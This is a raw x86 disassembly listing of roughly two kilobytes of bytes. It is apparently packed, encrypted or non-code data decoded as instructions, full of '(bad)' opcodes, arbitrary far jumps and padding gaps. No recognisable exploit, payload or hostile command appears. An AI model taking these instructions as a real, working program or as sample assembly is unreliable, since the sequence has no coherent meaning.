  41f20d:	bound  esp,QWORD PTR [ebp-0x31]
  41f210:	pushf  
  41f211:	nop
  41f212:	iret   
  41f213:	test   eax,0x5f924f61
  41f218:	or     al,0x50
  41f21a:	pop    edi
  41f21b:	jb     0x41f240
  41f21d:	popa   
  41f21e:	push   edi
  41f21f:	dec    edi
  41f220:	xor    DWORD PTR [esp+ecx*1-0x4deb747d],edx
  41f227:	cmc    
  41f228:	xchg   edx,eax
  41f229:	or     edx,esi
  41f22b:	and    DWORD PTR [edi],eax
  41f22d:	daa    
  41f22e:	pusha  
  41f22f:	push   ecx
  41f231:	mov    dl,0x92
  41f233:	leave  
  41f234:	dec    ebp
  41f235:	ins    DWORD PTR es:[edi],dx
  41f236:	xor    al,0xe0
  41f238:	fld    TBYTE PTR [eax+esi*8+0x4e]
  41f23c:	sbb    edi,DWORD PTR [esi+0x11]
  41f23f:	dec    edi
  41f240:	rcr    BYTE PTR [edx+0x6c],cl
  41f243:	mov    ecx,0x8edb32b8
  41f248:	mov    ds:0x868f46ee,eax
  41f24d:	sub    esi,ebx
  41f24f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f250:	ficomp DWORD PTR [edx+0x7ce6d81b]
  41f256:	pop    esi
  41f257:	mov    ebx,0xedf47841
  41f25c:	fimul  DWORD PTR [eax]
  41f25e:	mov    bl,0xc2
  41f260:	and    ecx,ebx
  41f262:	rcr    DWORD PTR [edi-0x4b],cl
  41f265:	sbb    DWORD PTR [esi],eax
  41f267:	push   edx
  41f268:	leave  
  41f269:	dec    edx
  41f26a:	(bad)  
  41f26b:	fsubrp st(2),st
  41f26d:	jae    0x41f2ec
  41f26f:	scas   al,BYTE PTR es:[edi]
  41f270:	sbb    eax,0x218ffcf5
  41f275:	push   esp
  41f276:	push   es
  41f277:	mov    ebx,0xa3855a5a
  41f27c:	dec    eax
  41f27d:	sti    
  41f27e:	sub    al,0xe2
  41f280:	and    bl,BYTE PTR [edi]
  41f282:	rcl    bh,1
  41f284:	ins    DWORD PTR es:[edi],dx
  41f285:	xlat   BYTE PTR ds:[ebx]
  41f286:	sub    al,0xf6
  41f288:	push   edx
  41f289:	inc    edx
  41f28a:	je     0x41f27b
  41f28c:	ins    DWORD PTR es:[edi],dx
  41f28d:	outs   dx,DWORD PTR ds:[esi]
  41f28e:	lock adc BYTE PTR [ebx],bh
  41f291:	ja     0x41f216
  41f293:	and    bh,BYTE PTR [esi-0x5b]
  41f296:	mov    ah,0x66
  41f298:	in     eax,0xf1
  41f29a:	mov    ebp,0xe1179f3
  41f29f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2a0:	cs ss gs sub eax,0x10d8057f
  41f2a8:	stos   DWORD PTR es:[edi],eax
  41f2a9:	(bad)  [edi+0x56f6fd]
	...
  41f2bb:	fwait
  41f2bc:	loope  0x41f32b
  41f2be:	sub    eax,0xf7dbad7f
  41f2c3:	sar    BYTE PTR [ebx],cl
  41f2c5:	(bad)  
  41f2c6:	add    BYTE PTR [eax+0x612b7406],bh
  41f2cc:	xchg   esp,eax
  41f2cd:	add    DWORD PTR [eax],eax
  41f2cf:	stos   DWORD PTR es:[edi],eax
  41f2d0:	add    BYTE PTR [eax],al
  41f2d2:	add    al,ch
  41f2d4:	(bad)  
  41f2d5:	pop    ss
  41f2d6:	in     al,0xb3
  41f2d8:	pop    edi
  41f2d9:	mov    edx,0x7aa2a285
  41f2de:	xchg   ebx,eax
  41f2df:	mov    bl,0xb
  41f2e1:	mov    dl,0xbd
  41f2e3:	std    
  41f2e4:	pushf  
  41f2e5:	and    edi,DWORD PTR [eax-0xbdccb4a]
  41f2eb:	ja     0x41f2e1
  41f2ed:	jle    0x41f2bc
  41f2ef:	jmp    0x8dacbec0
  41f2f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2f5:	enter  0x8737,0x3d
  41f2f9:	and    eax,0xbf1c7658
  41f2fe:	mov    dh,0xb2
  41f300:	xor    eax,0x2976200b
  41f305:	dec    esi
  41f306:	add    ecx,esi
  41f308:	and    ch,BYTE PTR [edx+0x3c]
  41f30b:	push   ebp
  41f30c:	jno    0x41f389
  41f30e:	loop   0x41f2b7
  41f310:	iret   
  41f311:	outs   dx,BYTE PTR ds:[esi]
  41f312:	inc    edx
  41f313:	xor    al,0x95
  41f315:	out    0x4d,eax
  41f317:	sbb    DWORD PTR [esi+0x2c9ea12f],edx
  41f31d:	xor    DWORD PTR [eax],ecx
  41f31f:	stos   DWORD PTR es:[edi],eax
  41f320:	add    BYTE PTR [eax+0x53fbd934],0x64
  41f327:	adc    eax,0x938dae70
  41f32c:	sub    bl,BYTE PTR [edi+0x37e6a609]
  41f332:	push   ss
  41f333:	or     al,0xf2
  41f335:	stc    
  41f336:	loopne 0x41f37e
  41f338:	int3   
  41f339:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f33a:	les    esi,FWORD PTR [ecx-0x35]
  41f33d:	cmp    edx,DWORD PTR [eax+0x46bb7f04]
  41f343:	add    ebp,eax
  41f345:	aaa    
  41f346:	push   cs
  41f347:	retf   
  41f348:	and    bh,al
  41f34a:	or     eax,0x61aa0939
  41f34f:	dec    edx
  41f350:	rcl    BYTE PTR [esi-0x1601b8dd],0xac
  41f357:	push   edi
  41f358:	ins    BYTE PTR es:[edi],dx
  41f359:	inc    edx
  41f35a:	sub    al,0x4
  41f35c:	xchg   BYTE PTR [ebp-0x6bc2a6c0],dh
  41f362:	mov    cl,0x3b
  41f364:	mov    cl,0xf3
  41f366:	outs   dx,DWORD PTR ds:[si]
  41f368:	(bad)  
  41f369:	(bad)  
  41f36a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f36b:	cmp    eax,0xc252b79d
  41f370:	(bad)  [ebp+0xa2401d]
  41f376:	or     bl,BYTE PTR [esi+0x68]
  41f379:	out    dx,eax
  41f37a:	jl     0x41f3a6
  41f37c:	enter  0x0,0x0
	...
  41f388:	add    BYTE PTR [eax],al
  41f38a:	add    BYTE PTR [eax],cl
  41f38c:	div    DWORD PTR [edi+0x4a]
  41f38f:	dec    edx
  41f391:	cmp    eax,0x2e8eedf7
  41f396:	dec    eax
  41f397:	or     ecx,DWORD PTR [esi+0x4]
  41f39a:	cmp    DWORD PTR [edx*4+0xab0001],ecx
  41f3a1:	add    BYTE PTR [eax],al
  41f3a3:	imul   ebx,DWORD PTR [edi],0x9c7255cc
  41f3a9:	leave  
  41f3aa:	pushf  
  41f3ab:	jl     0x41f3a2
  41f3ad:	aam    0xef
  41f3af:	add    dh,BYTE PTR [edi]
  41f3b1:	or     al,0x77
  41f3b3:	ror    DWORD PTR [ecx],cl
  41f3b5:	out    dx,eax
  41f3b6:	add    DWORD PTR [ebx],ebp
  41f3b8:	xchg   BYTE PTR [edx+0x3facd683],cl
  41f3be:	js     0x41f353
  41f3c0:	ficomp DWORD PTR [esi+0x31]
  41f3c3:	fisttp WORD PTR [esi-0x16]
  41f3c6:	xlat   BYTE PTR ds:[ebx]
  41f3c7:	inc    esp
  41f3c8:	mov    ds:0x2f820d57,eax
  41f3cd:	div    DWORD PTR ds:[esi+0x27c6605a]
  41f3d4:	push   esp
  41f3d5:	fcom   QWORD PTR [edx]
  41f3d7:	and    al,0x2
  41f3d9:	inc    edx
  41f3da:	(bad)  
  41f3db:	xor    eax,DWORD PTR [edx-0x7e1645ab]
  41f3e1:	mov    edi,0xbd4c814f
  41f3e6:	out    dx,al
  41f3e7:	adc    edi,ebp
  41f3e9:	jae    0x41f428
  41f3eb:	mov    ds:0xe0a22dc9,eax
  41f3f0:	sbb    al,0x3d
  41f3f2:	sub    ah,ch
  41f3f4:	mov    ebx,0x9803d1ca
  41f3f9:	test   BYTE PTR [edi-0x327d952],bh
  41f3ff:	jne    0x41f412
  41f401:	int    0xd4
  41f403:	shl    BYTE PTR [esi],cl
  41f405:	mov    edi,edx
  41f407:	inc    edi
  41f408:	rol    DWORD PTR [edi-0x2d629374],1
  41f40e:	sbb    al,0xef
  41f410:	outs   dx,BYTE PTR ds:[esi]
  41f411:	movsx  edi,al
  41f414:	xor    dl,BYTE PTR [esi+0x1ed9fa6a]
  41f41a:	loop   0x41f3ee
  41f41c:	cmp    al,0x13
  41f41e:	aaa    
  41f41f:	retf   0xce67
  41f422:	inc    edi
  41f423:	rcr    DWORD PTR [ecx-0x4f2cf85e],1
  41f429:	add    al,0xa8
  41f42b:	push   0x2e
  41f42d:	xchg   ebp,eax
  41f42e:	(bad)  
  41f42f:	sub    DWORD PTR [edx+0x5d],eax
  41f432:	ds cs dec ebx
  41f435:	iret   
  41f436:	mov    ds,ebx
  41f438:	shl    dl,0xc7
  41f43b:	aas    
  41f43c:	mov    esi,0xc6896158
  41f441:	dec    edx
  41f442:	mov    dh,0xb3
  41f444:	sbb    eax,0xb54030b4
  41f449:	xor    al,BYTE PTR [edi+edx*8+0x3d]
  41f44d:	inc    ecx
	...
  41f45a:	add    BYTE PTR [esi],dh
  41f45c:	arpl   WORD PTR [eax-0x10],bp
  41f45f:	jge    0x41f45c
  41f461:	mov    esi,0x8c7853e7
  41f466:	daa    
  41f467:	cmp    BYTE PTR [ebx+edi*4+0x195b7bc],al
  41f46e:	add    BYTE PTR [ebx+0x54000000],ch
  41f474:	fimul  DWORD PTR [esi-0x66]
  41f477:	out    0xbf,al
  41f479:	jle    0x41f478
  41f47b:	lods   al,BYTE PTR ds:[esi]
  41f47c:	mov    eax,ds:0x3378ace1
  41f481:	xchg   edx,eax
  41f482:	mov    edi,0x4a2043b2
  41f487:	dec    ebp
  41f488:	cld    
  41f489:	pushf  
  41f48a:	and    eax,0x776c221e
  41f48f:	cmp    dh,BYTE PTR [esi]
  41f491:	je     0x41f4b2
  41f493:	jb     0x41f452
  41f495:	lods   al,BYTE PTR ds:[esi]
  41f496:	out    0x7e,al
  41f498:	sub    al,0x1d
  41f49a:	and    al,BYTE PTR ds:0x5878b452
  41f4a0:	outs   dx,DWORD PTR ds:[esi]
  41f4a1:	pushf  
  41f4a2:	push   edx
  41f4a3:	(bad)  
  41f4a4:	arpl   WORD PTR [edi+0x1ee98d77],bx
  41f4aa:	imul   ebx,ecx,0x34a8581e
  41f4b0:	ret    
  41f4b1:	ret    
  41f4b2:	sub    dl,BYTE PTR [esi+0x14]
  41f4b5:	ret    
  41f4b6:	jnp    0x41f519
  41f4b8:	mov    eax,0x551438a4
  41f4bd:	sbb    al,0x74
  41f4bf:	sub    ebp,esi
  41f4c1:	xchg   esi,eax
  41f4c2:	out    0xd3,al
  41f4c4:	xor    al,0x6e
  41f4c6:	mov    eax,0xb78534d4
  41f4cb:	stos   DWORD PTR es:[edi],eax
  41f4cc:	ss pop ebp
  41f4ce:	sub    al,0x1d
  41f4d0:	loop   0x41f531
  41f4d2:	pop    ss
  41f4d3:	daa    
  41f4d4:	xor    eax,0x15e24875
  41f4d9:	pop    ebp
  41f4da:	xor    eax,0xedf9512f
  41f4df:	ss push ecx
  41f4e1:	mov    ds:0x61e9099e,eax
  41f4e6:	push   0x23
  41f4e8:	enter  0xc8d9,0x14
  41f4ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4ed:	std    
  41f4ee:	xchg   edi,eax
  41f4ef:	pop    eax
  41f4f0:	push   edx
  41f4f1:	jmp    0x41f529
  41f4f3:	add    eax,0x6b058ed4
  41f4f8:	mov    ds:0xf1c49e88,eax
  41f4fd:	imul   esp,ebp,0xffffffdf
  41f500:	sbb    ebp,DWORD PTR ss:[ecx]
  41f503:	(bad)  
  41f504:	push   ds
  41f505:	xor    edi,DWORD PTR [ecx-0x1afd265]
  41f50b:	js     0x41f513
  41f50d:	or     al,0xaf
  41f50f:	inc    BYTE PTR [ecx-0x8878469]
  41f515:	adc    BYTE PTR [esp+ecx*4-0x441e7ebb],ah
  41f51c:	or     BYTE PTR [ebx+0x0],0x0
	...
  41f52b:	daa    
  41f52c:	ss lahf 
  41f52e:	xor    DWORD PTR [edi+0x1536afb9],ebx
  41f534:	and    eax,0x63ca075b
  41f539:	jb     0x41f4fc
  41f53b:	adc    esp,DWORD PTR [ebx+0xab0001]
  41f541:	add    BYTE PTR [eax],al
  41f543:	mov    dh,0x46
  41f545:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f546:	adc    al,0x76
  41f548:	sub    DWORD PTR [edi+0x560ad196],edx
  41f54e:	das    
  41f54f:	test   al,ch
  41f551:	xchg   ecx,eax
  41f552:	jecxz  0x41f51c
  41f554:	stos   DWORD PTR es:[edi],eax
  41f555:	fcomp  st(3)
  41f557:	mov    DWORD PTR [edx],0xe2808e01
  41f55d:	cmp    dl,BYTE PTR [esi-0x32]
  41f560:	push   ss
  41f561:	and    BYTE PTR [ebx],dh
  41f563:	out    dx,al
  41f564:	(bad)  
  41f565:	sti    
  41f566:	sub    cl,bh
  41f568:	mov    ebx,0x2b6045e8
  41f56d:	and    edx,DWORD PTR [esi+edx*4-0x5158ca89]
  41f574:	mov    esi,DWORD PTR [ecx]
  41f576:	jecxz  0x41f58e
  41f578:	sbb    bl,BYTE PTR [edx+0x500a848e]
  41f57e:	dec    eax
  41f57f:	xor    BYTE PTR [edx+0x64],cl
  41f582:	mov    dh,0x64
  41f584:	mov    esi,0x4a7dca28
  41f589:	data16 jb 0x41f580
  41f58c:	sbb    al,0xcd
  41f58e:	mov    esp,ecx
  41f590:	xor    bl,cl
  41f592:	adc    al,0x26
  41f594:	les    ebx,FWORD PTR [edi+edi*1]
  41f597:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f598:	cli    
  41f599:	pop    edi
  41f59a:	sub    al,0x75
  41f59c:	shr    ecx,1
  41f59e:	pop    edi
  41f59f:	out    dx,al
  41f5a0:	aad    0x3a
  41f5a2:	add    eax,0x701575f
  41f5a7:	pop    ecx
  41f5a8:	shl    BYTE PTR [edi],0xe
  41f5ab:	jne    0x41f55d
  41f5ad:	jmp    0xb964:0x77bbdda2
  41f5b4:	jmp    0xd4a201ff
  41f5b9:	cwde   
  41f5ba:	lds    ecx,FWORD PTR [ebx+0x7f21cc5d]
  41f5c0:	cli    
  41f5c1:	mov    ch,0x7f
  41f5c3:	mov    al,0xa4
  41f5c5:	sbb    BYTE PTR ds:0x64c44a8d,ch
  41f5cb:	sub    esp,edi
  41f5cd:	pop    ebp
  41f5ce:	adc    cl,BYTE PTR [esi+0x55]
  41f5d1:	push   esi
  41f5d2:	add    DWORD PTR [esi-0x32],eax
  41f5d5:	das    
  41f5d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5d7:	iret   
  41f5d8:	outs   dx,DWORD PTR ds:[esi]
  41f5d9:	out    0x37,eax
  41f5db:	popf   
  41f5dc:	pop    esi
  41f5dd:	push   ds
  41f5de:	pop    ebx
  41f5df:	jle    0x41f56c
  41f5e1:	lds    esp,FWORD PTR [eax]
  41f5e3:	(bad)  
  41f5e4:	shl    BYTE PTR ds:0x9aa02001,1
  41f5ea:	inc    ebx
  41f5eb:	mov    eax,0x5a59
	...
  41f5f8:	add    BYTE PTR [eax],al
  41f5fa:	add    BYTE PTR [edi],dh
  41f5fc:	(bad)  
  41f5fd:	out    0xc2,eax
  41f5ff:	mul    ebx
  41f601:	aaa    
  41f602:	cmc    
  41f603:	xchg   ecx,eax
  41f604:	call   0x4ccf:0xac62eef4
  41f60b:	mov    esi,0xab0001a3
  41f610:	add    BYTE PTR [eax],al
  41f612:	add    BYTE PTR [ebx+0x1d],bh
  41f615:	mov    ds:0x4b5f4725,al
  41f61a:	push   eax
  41f61b:	adc    BYTE PTR [edi-0x3082639a],ch
  41f621:	xchg   BYTE PTR [edi-0xc50467d],cl
  41f627:	jg     0x41f5d0
  41f629:	sar    ah,0x74
  41f62c:	cmovg  ebx,DWORD PTR [ebx+0x485e520a]
  41f633:	loopne 0x41f653
  41f635:	shr    BYTE PTR [ebx-0x44],0x2e
  41f639:	pop    es
  41f63a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f63b:	outs   dx,DWORD PTR ds:[esi]
  41f63c:	aas    
  41f63d:	mov    ch,0x97
  41f63f:	repz ret 0x719b
  41f643:	sbb    eax,0x8088b36b
  41f648:	push   cs
  41f649:	aam    0xa
  41f64b:	mov    edi,ebp
  41f64d:	fist   DWORD PTR [edi]
  41f64f:	in     al,dx
  41f650:	(bad)  
  41f652:	adc    al,0x40
  41f654:	cmp    BYTE PTR [esi+0x62],bh
  41f657:	pop    edx
  41f658:	inc    ebx
  41f659:	out    dx,eax
  41f65a:	cmc    
  41f65b:	lock test eax,0x5e98fdbf
  41f661:	xor    ah,bh
  41f663:	push   cs
  41f664:	inc    ebx
  41f665:	sub    bh,dh
  41f667:	xchg   esp,eax
  41f668:	test   BYTE PTR [eax-0x5b],ch
  41f66b:	sub    BYTE PTR [ebx-0x45],bl
  41f66e:	inc    ecx
  41f66f:	xchg   BYTE PTR [esi-0x68bf2f05],ch
  41f675:	inc    ecx
  41f676:	dec    edi
  41f677:	xchg   ebx,eax
  41f678:	sub    DWORD PTR [eax+0x8],esi
  41f67b:	sbb    BYTE PTR [ebx+0x1a],dl
  41f67e:	adc    bh,dl
  41f680:	pop    esp
  41f681:	pop    esp
  41f682:	sar    dh,cl
  41f684:	pop    edi
  41f685:	add    edx,ebx
  41f687:	rcr    DWORD PTR [ebp+edx*8+0x754d4c99],cl
  41f68e:	inc    esi
  41f68f:	(bad)  
  41f690:	xor    DWORD PTR [eax-0x61],esp
  41f693:	jbe    0x41f70c
  41f695:	pop    ds
  41f696:	imul   esi,DWORD PTR [ebp+0x7fd7efaa],0x70fbfa7e
  41f6a0:	repz jecxz 0x41f67d
  41f6a3:	push   edx
  41f6a4:	mov    bl,0x4c
  41f6a6:	push   0x7d
  41f6a8:	imul   eax,esp,0xfffffff0
  41f6ab:	loop   0x41f6b2
  41f6ad:	mov    ebx,0xd08f9ea3
  41f6b2:	inc    ebx
  41f6b3:	and    DWORD PTR [ebx-0x29],ecx
  41f6b6:	mov    ch,0x15
  41f6b8:	and    DWORD PTR [ebp+ecx*4+0x4486d8],0x0
	...
  41f6c8:	add    BYTE PTR [eax],al
  41f6ca:	add    BYTE PTR [esi],dl
  41f6cc:	aad    0xdf
  41f6ce:	out    dx,eax
  41f6cf:	fucomip st,st(7)
  41f6d1:	ss std 
  41f6d3:	cmp    BYTE PTR [esi+0x50495f3a],al
  41f6d9:	pusha  
  41f6da:	jp     0x41f745
  41f6dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6dd:	add    DWORD PTR [eax],eax
  41f6df:	stos   DWORD PTR es:[edi],eax
  41f6e0:	add    BYTE PTR [eax],al
  41f6e2:	add    BYTE PTR [ebx+eax*1+0x7f],al
  41f6e6:	pop    ebp
  41f6e7:	mov    cl,0x7c
  41f6e9:	adc    esp,DWORD PTR [ebx]
  41f6eb:	jmp    0xd241db93
  41f6f0:	dec    esp
  41f6f1:	jb     0x41f75b
  41f6f3:	push   ds
  41f6f4:	enter  0x9262,0x34
  41f6f8:	out    0xdb,al
  41f6fa:	pushf  
  41f6fb:	retf   
  41f6fc:	loope  0x41f77a
  41f6fe:	inc    edi
  41f6ff:	lods   eax,DWORD PTR ds:[esi]
  41f700:	mov    ebx,0xb642437e
  41f705:	bound  edi,QWORD PTR [ebx+edi*1-0xb]
  41f709:	jns    0x41f6c0
  41f70b:	mov    ss,WORD PTR [eax+eiz*4+0x2f]
  41f70f:	or     DWORD PTR ds:0x5170073a,ebp
  41f715:	jmp    0x8b33a4f8
  41f71a:	test   eax,0x28a86146
  41f71f:	addr16 inc ebp
  41f721:	inc    esp
  41f722:	rol    dh,cl
  41f724:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f725:	xchg   edx,eax
  41f726:	mov    al,0x65
  41f728:	pop    edi
  41f729:	ds push ecx
  41f72b:	mov    BYTE PTR [edi],0xdf
  41f72e:	shl    DWORD PTR [edi-0x7d],0xe3
  41f732:	call   0xa59a:0xdca52e3
  41f739:	xchg   DWORD PTR [edi+ecx*1+0x5729eb60],edi
  41f740:	fcomp  DWORD PTR [ebx]
  41f742:	xchg   edx,eax
  41f743:	lds    esi,FWORD PTR [ecx+0x61665bcd]
  41f749:	jp     0x41f71a
  41f74b:	cli    
  41f74c:	das    
  41f74d:	(bad)  
  41f74e:	cld    
  41f74f:	fisub  DWORD PTR [eax-0x1]
  41f752:	call   0xd23b75a1
  41f757:	push   eax
  41f758:	shr    ebp,cl
  41f75a:	and    al,0xb0
  41f75c:	lea    esp,[ecx+esi*2]
  41f75f:	fst    QWORD PTR [ebx]
  41f761:	loopne 0x41f71c
  41f763:	arpl   WORD PTR [edi],bp
  41f765:	sahf   
  41f766:	imul   ebx,DWORD PTR [edi],0xa0ceeab
  41f76c:	xchg   ebx,eax
  41f76d:	xchg   ecx,eax
  41f76e:	bound  ecx,QWORD PTR [eax]
  41f770:	xor    al,0x58
  41f772:	push   ebx
  41f773:	pop    eax
  41f774:	inc    ebx
  41f775:	xchg   esp,eax
  41f776:	push   cs
  41f777:	(bad)
  41f77a:	mov    al,ds:0x7bd7f6d7
  41f77f:	jle    0x41f7a8
  41f781:	jmp    0x8995:0x31529a4d
  41f788:	mov    ebp,0xff708eeb
  41f78d:	(bad)  
	...
  41f79a:	add    BYTE PTR [esi+0x76],ch
  41f79d:	in     al,0xca
  41f79f:	cld    
  41f7a0:	fisubr DWORD PTR [esi-0xa]
  41f7a3:	sbb    BYTE PTR [edx+0x67e69787],dl
  41f7a9:	mov    eax,0x1a5146b
  41f7ae:	add    BYTE PTR [ebx+0x47000000],ch
  41f7b4:	xor    cl,BYTE PTR [edi]
  41f7b6:	xor    BYTE PTR [esi],cl
  41f7b8:	xchg   edx,eax
  41f7b9:	leave  
  41f7ba:	(bad)  
  41f7bb:	sub    BYTE PTR [edx-0x7beabc5f],dl
  41f7c1:	loope  0x41f7f1
  41f7c3:	cwde   
  41f7c4:	mov    ecx,0xf03df32
  41f7c9:	push   ss
  41f7ca:	ret    0x942a
  41f7cd:	xchg   ebp,eax
  41f7ce:	shr    DWORD PTR [eax-0x65],cl
  41f7d1:	mov    edi,0x60c659b3
  41f7d6:	das    
  41f7d7:	xchg   ebp,eax
  41f7d8:	adc    al,0x25
  41f7da:	push   esi
  41f7db:	(bad)  
  41f7dc:	jae    0x41f81f
  41f7de:	mov    esp,0x9744d37c
  41f7e3:	mov    ds:0x6221b172,eax
  41f7e8:	shl    BYTE PTR [edi],1
  41f7ea:	mov    bl,0x22
  41f7ec:	test   eax,0xcf8acfaf
  41f7f1:	mov    ecx,0xf80ea6ca
  41f7f6:	ins    DWORD PTR es:[edi],dx
  41f7f7:	adc    al,BYTE PTR [ecx]
  41f7f9:	and    edx,DWORD PTR [ecx]
  41f7fb:	test   BYTE PTR [esi+0x1e],ch
  41f7fe:	in     eax,dx
  41f7ff:	pop    ds
  41f800:	push   es
  41f801:	lods   eax,DWORD PTR ds:[esi]
  41f802:	cmp    al,0xad
  41f804:	loopne 0x41f848
  41f806:	test   eax,0x90dcc587
  41f80b:	aam    0xfd
  41f80d:	xor    al,0xa1
  41f80f:	sbb    al,0xd9
  41f811:	ficom  WORD PTR [ecx-0x59]
  41f814:	add    dl,BYTE PTR [ecx+0x32d0964f]
  41f81a:	xchg   edi,eax
  41f81b:	in     eax,dx
  41f81c:	fxch   st(6)
  41f81e:	in     eax,dx
  41f81f:	inc    ebx
  41f820:	dec    edx
  41f821:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f822:	inc    ebx
  41f823:	mov    ecx,0xe873e849
  41f828:	fisttp WORD PTR [edx+0x2f]
  41f82b:	les    ebp,FWORD PTR [ecx-0x96f4e60]
  41f831:	out    dx,eax
  41f832:	xchg   ecx,eax
  41f833:	icebp  
  41f834:	test   eax,0xa999a0c7
  41f839:	jmp    0x5ece8cd6
  41f83e:	test   DWORD PTR [edi+0x21a1779],edx
  41f844:	inc    ebx
  41f845:	out    dx,eax
  41f846:	dec    DWORD PTR [ebx-0x51]
  41f849:	adc    eax,0x20fbf6ad
  41f84e:	push   eax
  41f84f:	jb     0x41f8a3
  41f851:	fwait
  41f852:	or     eax,0xc3c8fe0d
  41f858:	dec    edx
  41f859:	or     al,0xa2
  41f85b:	inc    eax
  41f85c:	push   es
  41f85d:	scas   eax,DWORD PTR es:[edi]
	...
  41f86a:	add    BYTE PTR [edx],bh
  41f86c:	push   edx
  41f86d:	les    ecx,FWORD PTR [edi]
  41f86f:	in     al,dx
  41f870:	lahf   
  41f871:	sti    
  41f872:	ja     0x41f86a
  41f874:	rcl    DWORD PTR [eax-0x4ee6c42d],1
  41f87a:	pop    es
  41f87b:	mov    edi,0xab0001a5
  41f880:	add    BYTE PTR [eax],al
  41f882:	add    BYTE PTR [eax],ah
  41f884:	les    esp,FWORD PTR [esi-0x68fb86ee]
  41f88a:	xchg   esp,eax
  41f88b:	sbb    cl,BYTE PTR [esi-0xe]
  41f88e:	(bad)  
  41f88f:	xlat   BYTE PTR ds:[ebx]
  41f890:	rcl    DWORD PTR [esi-0x65877383],cl
  41f896:	aam    0xb9
  41f898:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f899:	sub    DWORD PTR [eax+0x3],ebx
  41f89c:	push   edx
  41f89d:	out    0x54,eax
  41f89f:	pandn  mm4,mm1
  41f8a2:	das    
  41f8a3:	int3   
  41f8a4:	in     al,dx
  41f8a5:	mov    es,edi
  41f8a7:	retf   0xcd85
  41f8aa:	or     ah,BYTE PTR [ebx+edi*4+0x11]
  41f8ae:	push   cs
  41f8af:	dec    esi
  41f8b0:	mov    ah,0x86
  41f8b2:	int    0x93
  41f8b4:	imul   ebx,DWORD PTR [ebp-0x28],0x3b
  41f8b8:	ficomp DWORD PTR [ecx-0x32]
  41f8bb:	xchg   ebx,eax
  41f8bc:	cmp    ah,BYTE PTR [ebx+0x494c3a71]
  41f8c2:	fs retf 
  41f8c4:	outs   dx,BYTE PTR ds:[esi]
  41f8c5:	sbb    esi,edx
  41f8c7:	adc    al,0xd4
  41f8c9:	shl    DWORD PTR [ebp+0x56],1
  41f8cc:	cli    
  41f8cd:	es loopne 0x41f879
  41f8d0:	ficom  DWORD PTR [edx+ebx*2+0x39]
  41f8d4:	cmp    ebp,DWORD PTR [ebx+0x8]
  41f8d7:	push   es
  41f8d8:	retf   0x470e
  41f8db:	mov    eax,0xaf546978
  41f8e0:	mov    bl,0x77
  41f8e2:	xor    DWORD PTR [esi],0xffffff92
  41f8e5:	pop    ecx
  41f8e6:	xor    al,0x52
  41f8e8:	stos   BYTE PTR es:[edi],al
  41f8e9:	xor    al,0x34
  41f8eb:	jge    0x41f8f0
  41f8ed:	setb   BYTE PTR [ebp+0x45]
  41f8f1:	leave  
  41f8f2:	imul   ebx,DWORD PTR [esi+0x4907278],0xc2aa05e4
  41f8fc:	pop    edx
  41f8fd:	cdq    
  41f8fe:	inc    esi
  41f8ff:	adc    edx,DWORD PTR [edi-0x6b]
  41f902:	push   cs
  41f903:	sbb    al,0xa2
  41f905:	add    edi,DWORD PTR ds:0xa3dbf269
  41f90b:	push   ss
  41f90c:	adc    ebx,esi
  41f90e:	and    bh,dl
  41f910:	(bad)  [bx+0xb4a]
  41f915:	cmp    BYTE PTR [ecx+0x64f2df10],ah
  41f91b:	fnstcw WORD PTR [ecx-0x7bea03f4]
  41f921:	test   BYTE PTR [edx+ecx*8+0x25],0xfc
  41f926:	and    ah,ah
  41f928:	inc    esp
  41f929:	cmp    eax,DWORD PTR [ebx-0x5c]
  41f92c:	aas    
  41f92d:	enter  0x0,0x0
	...
  41f939:	add    BYTE PTR [eax],al
  41f93b:	xchg   ebx,eax
  41f93c:	cmp    DWORD PTR [ebp-0x2c814294],0xffffffff
  41f943:	push   eax
  41f944:	loopne 0x41f940
  41f946:	call   0xa66a:0xbbd0b1d3
  41f94d:	add    DWORD PTR [eax],eax
  41f94f:	stos   DWORD PTR es:[edi],eax
  41f950:	add    BYTE PTR [eax],al
  41f952:	add    BYTE PTR [ebp-0x1c474ab],bl
  41f958:	jne    0x41f9a5
  41f95a:	xor    BYTE PTR [bp+di],ch
  41f95d:	sub    al,0x65
  41f95f:	fist   DWORD PTR [ebp+0xc]
  41f962:	adc    al,0xef
  41f964:	rcr    DWORD PTR ds:0x18a37351,1
  41f96a:	cwde   
  41f96b:	es cdq 
  41f96d:	inc    edi
  41f96e:	sbb    BYTE PTR [edi-0x3c050d51],0x3f
  41f975:	push   edx
  41f976:	dec    esi
  41f977:	mov    bh,0x65
  41f979:	into   
  41f97a:	and    ch,BYTE PTR [edx-0x4507c7f]
  41f980:	sbb    eax,0x4fa0f8c4
  41f985:	xchg   BYTE PTR [esi+0x7c],bh
  41f988:	ja     0x41fa02
  41f98a:	out    0x56,eax
  41f98c:	cdq    
  41f98d:	repz inc edi
  41f98f:	scas   al,BYTE PTR es:[edi]
  41f990:	(bad)  
  41f991:	cmp    DWORD PTR [ecx-0x6f194aa6],edx
  41f997:	sub    ch,BYTE PTR [ecx]
  41f999:	add    BYTE PTR [edi+eiz*1-0x58991117],cl
  41f9a0:	(bad)  
  41f9a1:	call   0xb3fcf212
  41f9a6:	mov    al,BYTE PTR ds:0xb2af8556
  41f9ac:	dec    BYTE PTR [eax-0x6b0ec50d]
  41f9b2:	int3   
  41f9b3:	in     eax,dx
  41f9b4:	xor    bl,dh
  41f9b6:	jg     0x41f969
  41f9b8:	test   eax,0xd78a01e
  41f9bd:	adc    BYTE PTR [edi+ebp*8],dl
  41f9c0:	or     ah,BYTE PTR [esi-0x599e43ea]
  41f9c6:	out    dx,al
  41f9c7:	adc    al,0xa7
  41f9c9:	xor    al,0x39
